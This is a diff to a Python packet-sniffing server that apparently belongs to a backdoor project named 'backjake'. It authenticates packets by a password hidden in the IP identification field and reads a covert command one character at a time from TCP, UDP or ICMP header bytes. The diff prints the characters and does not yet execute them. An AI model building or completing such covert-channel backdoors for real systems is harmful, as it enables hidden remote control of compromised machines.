@@ -7,6 +7,8 @@ import config
 import backjake
 import utils
 
+command = ""
+
 def recieveDatagram():
 	cap = pcapy.open_live(config.dev, 65536, 1, 0)
 	cap.setfilter('tcp or udp or icmp')
@@ -22,13 +24,15 @@ def startServer():
 
 def packetHandler(packet):
 	if (authenticated(packet)):
-		ip, protoH, data = stripPacket(packet, checkType(packet))
-		executeCommand(ip, protoH, data)
+		pacType = checkType(packet)
+		ip, protoH, data = stripPacket(packet, pacType)
+		executeCommand(ip, protoH, data, pacType)
 
 def stripPacket(packet, proto):
 	ipLength = 20
 	udpLength = 8
 	icmpLength = 4
+	ethLength = 14
 	
 	ip = packet[ethLength:ipLength+ethLength]  # start from after ethernet, go 20 characters
 	ipHeader = unpack('!BBHHHBBH4s4s', ip)
@@ -75,9 +79,23 @@ def authenticated(packet):
 
 	# check ip identification field for encrypted password
  	if ipIdent == pswd:
- 		## place in buffer, then execute when finished
- 		print "auth!"
+ 		return True
 
-def executeCommand(ip, proto, data):
-	print "executeCommand"
+ 	return False
+
+def executeCommand(ip, proto, data, pacType):
+	character = ''
+
+	if pacType == 'tcp':
+		character = proto[2]
+	elif pacType == 'udp':
+		character = proto[6]
+	elif pacType == 'icmp':
+		character = proto[2]
+
+	# print proto
+	if chr(character) != '\n':
+		print chr(character)
+	else:
+		print "end of command"
 
